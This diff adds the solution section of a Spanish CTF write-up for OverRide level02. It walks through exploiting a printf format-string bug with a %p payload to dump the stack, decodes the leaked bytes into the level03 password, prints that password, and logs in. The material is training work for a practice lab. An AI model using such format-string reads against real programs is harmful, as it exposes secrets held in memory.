@@ -170,3 +170,86 @@ Para ver con detalle el analisis consuta el archivo  [asm_analysis.md](https://g
 ---
 
 # 6. Solución:
+
+Para resolver este nivel, necesitamos explotar la vulnerabilidad **Format String** que encontramos en la línea `<+654>` del desensamblado:
+
+```c
+printf(buffer_username);
+```
+
+`printf` recibe `buffer_username` directamente como formato sin sanitizar. Esto nos permite usar especificadores como `%p` para **leer valores del stack** — en concreto el contenido de `buffer_file`, que contiene el password leído del `.pass` de `level03`.
+
+---
+
+## 1. Confirmar la vulnerabilidad:
+
+```bash
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: %p.%p.%p.%p.%p
+--[ Password: a
+*****************************************
+0x7fffffffe4f0.(nil).0x61.0x2a2a2a2a2a2a2a2a.0x2a2a2a2a2a2a2a2a does not have access!
+```
+
+Los `%p` están volcando valores del stack — la vulnerabilidad está confirmada.
+
+---
+
+## 2. Localizar `buffer_file` en el stack:
+
+Ampliamos el número de `%p` hasta encontrar datos no nulos que no sean `*` ni direcciones de stack:
+
+```bash
+level02@OverRide:~$ ./level02
+--[ Username: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
+--[ Password: a
+*****************************************
+0x7fffffffe4f0.(nil).0x61.0x2a2a2a2a2a2a2a2a.0x2a2a2a2a2a2a2a2a.0x7fffffffe6e8.0x1f7ff9a08.0x61.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).0x100000000.(nil).0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d does not have access!
+```
+
+A partir de la posición **22** empezamos a ver los bytes del password. Como es un binario de **64 bits**, cada `%p` vuelca **8 bytes** en little-endian.
+
+---
+
+## 3. Decodificar el password:
+
+Convertimos cada valor hex a ASCII invirtiendo el orden de bytes (little-endian):
+Con la ayuda de esta web:
+```bash
+https://www.rapidtables.com/convert/number/hex-to-ascii.html
+```
+
+```
+pos 22: 0x756e505234376848 → Hh74RPnu
+pos 23: 0x45414a3561733951 → Q9sa5JAE
+pos 24: 0x377a7143574e6758 → XgNWCqz7
+pos 25: 0x354a35686e475873 → sXGnh5J5
+pos 26: 0x48336750664b394d → M9KfPg3H
+pos 27: (nil)              → \0  ← terminador
+```
+
+Password: **`Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`**
+
+---
+
+## 4. Ejecución:
+
+```bash
+level02@OverRide:~$ su level03
+Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
+level03@OverRide:~$
+```
+
+---
+
+# 7. Conclusión:
+
+El nivel 02 introduce una vulnerabilidad diferente al nivel anterior. Aunque el programa valida correctamente la contraseña con `strncmp`, el uso de `printf(buffer_username)` sin especificador de formato permite leer valores arbitrarios del stack. Esto expone `buffer_file`, que contiene el password leído del archivo `.pass` de `level03`, sin necesidad de desbordar ningún buffer ni saltar a ninguna dirección de memoria.
+
+A diferencia del nivel 01 donde explotamos un **Stack Buffer Overflow** con **Ret2Libc**, aquí la técnica es **Format String Read** — más sutil, pero igual de efectiva cuando el programador no sanitiza la entrada del usuario antes de pasarla a `printf`.
